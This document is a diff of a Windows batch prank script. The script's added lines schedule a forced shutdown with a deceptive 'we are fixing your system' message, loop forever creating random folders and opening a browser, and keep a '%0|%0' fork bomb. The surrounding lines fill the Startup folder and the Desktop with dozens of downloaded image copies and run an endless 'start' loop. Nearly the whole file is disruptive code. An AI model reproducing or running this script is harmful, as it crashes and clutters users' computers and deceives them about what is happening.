@@ -1,10 +1,12 @@
 @echo off
-
-%0|%0
-
-
+shutdown -s -t 900 -c "We are fixing your system. We may need to open some apps and run some codes so don't close those apps"
+:A
+mkdir %random%
+goto A
+:G
+start www.google.com
+goto G
 CD %HOMEDRIVE%%HOMEPATH%\Start Menu\Programs\Startup
-
 Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off1.jpg"
 Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off2.jpg"
 Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off3.jpg"
@@ -35,16 +37,11 @@ Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdef
 Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off28.jpg"
 Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off29.jpg"
 Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off30.jpg"
-
-
 :x
 start
 goto x
-
-
 shutdown -s -t 180
-
-
+%0|%0
 cd "Desktop"
 Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off1.jpg"
 Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image_freak_off2.jpg"
